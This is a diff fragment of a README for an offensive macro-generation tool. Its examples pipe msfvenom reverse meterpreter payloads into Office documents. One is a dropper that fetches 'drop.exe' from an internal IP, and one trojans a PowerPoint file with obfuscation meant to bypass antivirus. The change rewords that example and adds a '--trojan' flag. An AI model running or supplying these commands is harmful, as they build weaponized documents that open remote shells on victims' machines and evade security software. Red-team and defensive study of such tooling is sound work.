@@ -128,9 +128,9 @@ echo "http://10.5.5.12/drop.exe" "dropped.exe" | macro_pack.exe -o -t DROPPER2 -
 msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --vbom-encode --keep-alive  -W  out.docm
 ```
 
-- Genenerate a PowerPoint file containing reverse meterpreter. Macro is obfuscated and mangled to bypass most antiviruses. 
+- Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass most antiviruses. 
 ```bash
-msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --av-bypass -P  hotpics.pptm
+msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --av-bypass --trojan -P  hotpics.pptm
 ```
 
 
